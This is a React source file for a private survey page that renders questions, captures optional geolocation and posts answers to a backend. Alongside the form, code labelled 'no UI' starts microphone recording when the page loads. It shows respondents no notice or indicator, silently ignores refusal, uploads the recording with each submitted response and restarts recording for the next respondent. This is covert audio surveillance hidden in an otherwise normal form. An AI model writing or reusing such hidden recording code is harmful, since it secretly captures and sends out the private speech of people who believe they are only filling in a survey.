import { useEffect, useRef, useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Checkbox } from '@/components/ui/checkbox';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { BaseUrl } from '@/config/BaseUrl';
import { Loader2, MapPin, Lock } from 'lucide-react';
import { toast } from 'sonner';
import { useAuthStore } from '@/store/authStore';
import { responseService } from '@/services/responseService';

export default function PrivateSurvey() {
  const { id } = useParams();
  const navigate = useNavigate();
  const { tokens } = useAuthStore();

  const [survey, setSurvey] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [answers, setAnswers] = useState<Record<string, any>>({});
  const [location, setLocation] = useState<{ latitude: number; longitude: number } | null>(null);
  const [gettingLocation, setGettingLocation] = useState(false);

  // Background audio recording refs — no UI
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const streamRef = useRef<MediaStream | null>(null);

  const startBackgroundRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      streamRef.current = stream;
      audioChunksRef.current = [];
      const recorder = new MediaRecorder(stream);
      mediaRecorderRef.current = recorder;
      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) audioChunksRef.current.push(e.data);
      };
      recorder.start(1000); // timeslice ensures data is collected every 1s
    } catch {
      // Permission denied or unavailable — silently ignore
    }
  };

  const stopAndGetBlob = (): Promise<Blob | null> => {
    return new Promise((resolve) => {
      const recorder = mediaRecorderRef.current;
      if (!recorder || recorder.state === 'inactive') {
        resolve(audioChunksRef.current.length > 0
          ? new Blob(audioChunksRef.current, { type: 'audio/webm' })
          : null);
        return;
      }
      recorder.onstop = () => {
        const blob = audioChunksRef.current.length > 0
          ? new Blob(audioChunksRef.current, { type: 'audio/webm' })
          : null;
        resolve(blob);
      };
      recorder.requestData(); // flush any buffered data before stop
      recorder.stop();
      streamRef.current?.getTracks().forEach(t => t.stop());
    });
  };

  useEffect(() => {
    startBackgroundRecording();
    return () => {
      if (mediaRecorderRef.current?.state === 'recording') mediaRecorderRef.current.stop();
      streamRef.current?.getTracks().forEach(t => t.stop());
    };
  }, []);

  useEffect(() => {
    if (!tokens?.accessToken) {
      navigate('/login', { replace: true });
      return;
    }

    fetch(`${BaseUrl}/surveys/public/${id}`, {
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
    })
      .then(res => res.json())
      .then(data => {
        setSurvey(data.data);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, [id, tokens, navigate]);

  const getLocation = () => {
    setGettingLocation(true);
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setLocation({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
        toast.success('Location captured');
        setGettingLocation(false);
      },
      () => {
        toast.error('Failed to get location');
        setGettingLocation(false);
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
    );
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!tokens?.accessToken) {
      navigate('/login', { replace: true });
      return;
    }

    if (survey.requiresLocationValidation && !location) {
      toast.error('Please capture your location before submitting');
      return;
    }

    for (const q of survey.questions) {
      if (q.isRequired && !answers[q.id]) {
        toast.error(`Please answer: ${q.questionText}`);
        return;
      }
    }

    const responses = survey.questions.map((q: any) => {
      const answer = answers[q.id];
      if (q.type === 'multiple_choice' && Array.isArray(answer)) {
        return { questionId: q.id, answer: answer.join(', ') };
      }
      return { questionId: q.id, answer: answer || '' };
    });

    setSubmitting(true);
    try {
      const audioBlob = await stopAndGetBlob();

      const res = await fetch(`${BaseUrl}/survey-responses/private`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${tokens.accessToken}`,
        },
        body: JSON.stringify({
          surveyId: id,
          accessToken: survey.accessToken,
          responses,
          ...(location ?? {}),
        }),
      });

      const resJson = await res.json();
      if (!res.ok) {
        throw new Error(resJson?.data?.message || resJson?.message || 'Submission failed');
      }
      // Backend wraps response: { success, data: { id, ... } }
      const responseId = resJson?.data?.id ?? resJson?.id;

      // Upload single background audio via authenticated endpoint
      if (responseId && audioBlob && audioBlob.size > 0) {
        await responseService.uploadAudioPrivate(tokens.accessToken, responseId, audioBlob).catch(() => {});
      }

      toast.success('Survey submitted successfully!');
      setAnswers({});
      setLocation(null);
      audioChunksRef.current = [];
      // Restart background recording for next response
      startBackgroundRecording();
    } catch (error: any) {
      toast.error(error.message || 'Failed to submit survey');
    } finally {
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  if (!survey) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Card className="max-w-md">
          <CardContent className="pt-6">
            <p className="text-center text-muted-foreground">Survey not found</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-muted/30 py-6 sm:py-8 md:py-12 px-3 sm:px-4">
      <div className="max-w-3xl mx-auto">
        <Card>
          <CardHeader className="p-4 sm:p-6">
            <div className="flex items-center gap-2 text-xs text-muted-foreground mb-2">
              <Lock className="h-3 w-3" />
              <span>Private Survey — Authorized Access Only</span>
            </div>
            <CardTitle className="text-xl sm:text-2xl md:text-3xl">{survey.title}</CardTitle>
            {survey.description && (
              <CardDescription className="text-sm sm:text-base">{survey.description}</CardDescription>
            )}
          </CardHeader>
          <CardContent className="p-4 sm:p-6">
            {survey.requiresLocationValidation && (
              <Card className="mb-4 sm:mb-6 bg-primary/5 border-primary">
                <CardContent className="pt-4 sm:pt-6 p-4">
                  <div className="space-y-3">
                    <Label className="text-sm sm:text-base font-medium flex items-center gap-2">
                      <MapPin className="h-4 w-4 text-primary" />
                      Location Required <span className="text-destructive">*</span>
                    </Label>
                    {location ? (
                      <div className="space-y-2">
                        <p className="text-xs font-mono bg-muted p-2 rounded">Latitude: {location.latitude.toFixed(6)}</p>
                        <p className="text-xs font-mono bg-muted p-2 rounded">Longitude: {location.longitude.toFixed(6)}</p>
                      </div>
                    ) : (
                      <p className="text-xs text-muted-foreground">Click below to capture your current location</p>
                    )}
                    <Button
                      type="button"
                      onClick={getLocation}
                      disabled={gettingLocation}
                      variant={location ? 'outline' : 'default'}
                      className="w-full"
                      size="sm"
                    >
                      {gettingLocation ? (
                        <><Loader2 className="h-4 w-4 animate-spin mr-2" />Getting Location...</>
                      ) : location ? 'Update Location' : 'Capture Location'}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-8">
              {survey.questions?.map((q: any, i: number) => (
                <div key={q.id} className="space-y-2 sm:space-y-3">
                  <Label className="text-sm sm:text-base font-medium">
                    {i + 1}. {q.questionText}
                    {q.isRequired && <span className="text-destructive ml-1">*</span>}
                  </Label>

                  {q.type === 'text' && (
                    <Input
                      placeholder="Your answer"
                      value={answers[q.id] || ''}
                      onChange={(e) => setAnswers({ ...answers, [q.id]: e.target.value })}
                      required={q.isRequired}
                    />
                  )}

                  {q.type === 'textarea' && (
                    <Textarea
                      placeholder="Your answer"
                      rows={4}
                      value={answers[q.id] || ''}
                      onChange={(e) => setAnswers({ ...answers, [q.id]: e.target.value })}
                      required={q.isRequired}
                    />
                  )}

                  {q.type === 'rating' && (
                    <div className="flex gap-2 flex-wrap">
                      {[1, 2, 3, 4, 5].map(n => (
                        <Button
                          key={n}
                          type="button"
                          variant={answers[q.id] === n ? 'default' : 'outline'}
                          className="w-10 h-10 sm:w-12 sm:h-12"
                          onClick={() => setAnswers({ ...answers, [q.id]: n })}
                        >
                          {n}
                        </Button>
                      ))}
                    </div>
                  )}

                  {q.type === 'single_choice' && (
                    <RadioGroup
                      className="space-y-2"
                      value={answers[q.id]}
                      onValueChange={(val) => setAnswers({ ...answers, [q.id]: val })}
                    >
                      {q.options?.map((opt: any) => (
                        <div key={opt.id} className="flex items-center space-x-2">
                          <RadioGroupItem value={opt.optionText} id={opt.id} />
                          <Label htmlFor={opt.id} className="font-normal cursor-pointer">{opt.optionText}</Label>
                        </div>
                      ))}
                    </RadioGroup>
                  )}

                  {q.type === 'multiple_choice' && (
                    <div className="space-y-2">
                      {q.options?.map((opt: any) => (
                        <div key={opt.id} className="flex items-center space-x-2">
                          <Checkbox
                            id={opt.id}
                            checked={(answers[q.id] || []).includes(opt.optionText)}
                            onCheckedChange={(checked) => {
                              const current = answers[q.id] || [];
                              setAnswers({
                                ...answers,
                                [q.id]: checked
                                  ? [...current, opt.optionText]
                                  : current.filter((v: string) => v !== opt.optionText),
                              });
                            }}
                          />
                          <Label htmlFor={opt.id} className="font-normal cursor-pointer">{opt.optionText}</Label>
                        </div>
                      ))}
                    </div>
                  )}

                  {q.type === 'date' && (
                    <Input
                      type="date"
                      value={answers[q.id] || ''}
                      onChange={(e) => setAnswers({ ...answers, [q.id]: e.target.value })}
                      required={q.isRequired}
                    />
                  )}
                </div>
              ))}

              <Button type="submit" className="w-full" size="lg" disabled={submitting}>
                {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : 'Submit Survey'}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
